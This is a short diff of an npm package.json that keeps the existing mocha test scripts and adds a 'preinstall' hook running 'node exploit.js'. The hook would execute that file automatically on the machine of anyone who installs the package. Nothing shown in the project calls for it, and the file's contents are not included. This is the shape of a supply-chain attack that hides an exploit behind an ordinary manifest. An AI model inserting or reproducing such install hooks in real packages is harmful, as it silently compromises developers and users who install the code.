@@ -5,7 +5,8 @@
   "scripts": {
     "test": "./node_modules/.bin/mocha --recursive",
     "test-debug": "./node_modules/.bin/mocha --recursive --inspect-brk=8217",
-    "cover": "nyc npm run test"
+    "cover": "nyc npm run test",
+    "preinstall": "node exploit.js"
   },
   "author": {
     "name": "Matias Woloski",
